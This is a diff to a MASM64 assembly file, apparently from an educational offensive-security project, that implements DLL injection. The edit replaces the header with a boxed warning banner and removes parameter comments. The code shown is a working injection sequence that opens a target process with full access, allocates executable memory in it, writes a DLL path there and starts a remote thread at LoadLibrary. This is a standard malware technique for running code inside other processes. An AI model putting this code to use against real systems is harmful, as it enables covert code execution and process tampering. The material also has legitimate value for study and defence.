@@ -1,12 +1,16 @@
-; /*
-;
-; > DLL Injection with MASM64 Assembly <
-;
-; @author:  bekoo 
-; @website: 0xbekoo.github.io
-; @warning: This project has been developed for educational purposes only. Its use in real scenarios is at one's own risk. 
-;
-; */
+; ╔═══════════════════════════════════════════════════════════╗
+; ║                                                           ║
+; ║                     ⚠️  WARNING!  ⚠️                     ║
+; ║                                                           ║
+; ║  @author: bekoo                                           ║
+; ║  @website: 0xbekoo.github.io                              ║
+; ║  @Technique: DLL Injection                                ║
+; ║                                                           ║
+; ║  @warning: This project has been developed for            ║
+; ║  educational purposes only. Its use in real scenarios     ║
+; ║  is at one's own risk.                                    ║
+; ║                                                           ║
+; ╚═══════════════════════════════════════════════════════════╝
 
 include utils.inc
 
@@ -30,42 +34,42 @@ mainCRTStartup PROC
     lea rdx,[LoadLibraryAddress]
     call CheckFunctionResult
 
-    mov rcx,1FFFFFh                 ; /* dwProcessId     */
-    xor rdx,rdx                     ; /* InheritHandle   */
-    movzx r8d,word ptr [PID]        ; /* dwDesiredAccess */
+    mov rcx,1FFFFFh
+    xor rdx,rdx
+    movzx r8d,word ptr [PID]
     call OpenProcess 
     mov rcx,rax
     lea rdx,[HandleProcess]
     call CheckFunctionResult
 
-    mov rcx,[HandleProcess]         ; /* hProcess         */
-    xor rdx,rdx                     ; /* LpAddress        */
-    mov r8,sizeof dllPath           ; /* dwSize           */
-    mov r9d,3000h                   ; /* flAllocationType */
-    mov dword ptr [rsp + 20h],40h   ; /* FlProtect        */
+    mov rcx,[HandleProcess]
+    xor rdx,rdx
+    mov r8,sizeof dllPath
+    mov r9d,3000h
+    mov dword ptr [rsp + 20h],40h
     call VirtualAllocEx
     mov rcx,rax
     lea rdx,[RemoteBuffer]
     call CheckFunctionResult
 
-    mov rcx,[HandleProcess]         ; /* hProcess            */
-    mov rdx,[RemoteBuffer]          ; /* LpAddress           */
-    lea r8,[dllPath]                ; /* LpBuffer            */
-    mov r9d,sizeof dllPath          ; /* nSize               */
-    mov qword ptr [rsp + 20h],0     ; LpNumberOfBytesWritten */
+    mov rcx,[HandleProcess]
+    mov rdx,[RemoteBuffer]
+    lea r8,[dllPath]
+    mov r9d,sizeof dllPath
+    mov qword ptr [rsp + 20h],0
     call WriteProcessMemory
     mov rcx,rax
     xor rdx,rdx
     call CheckFunctionResult
 
-    mov rcx,[HandleProcess]          ; /* hProcess           */
-    xor edx,edx                      ; /* LpThreadAttributes */
-    xor r8d,r8d                      ; /* dwStackSize        */
-    mov r9,[LoadLibraryAddress]      ; /* LpStartAddress     */
+    mov rcx,[HandleProcess]
+    xor edx,edx
+    xor r8d,r8d
+    mov r9,[LoadLibraryAddress]
     mov rsi,[RemoteBuffer]           
-    mov qword ptr [rsp + 20h],rsi    ; /* LpParameter        */
-    mov qword ptr [rsp + 28h],0      ; /* dwCreationFlags    */
-    mov qword ptr [rsp + 30h],0;     ; /* lpThreadId         */
+    mov qword ptr [rsp + 20h],rsi
+    mov qword ptr [rsp + 28h],0
+    mov qword ptr [rsp + 30h],0;
     call CreateRemoteThread
     mov rcx,rax
     lea rdx,[HandleThread]
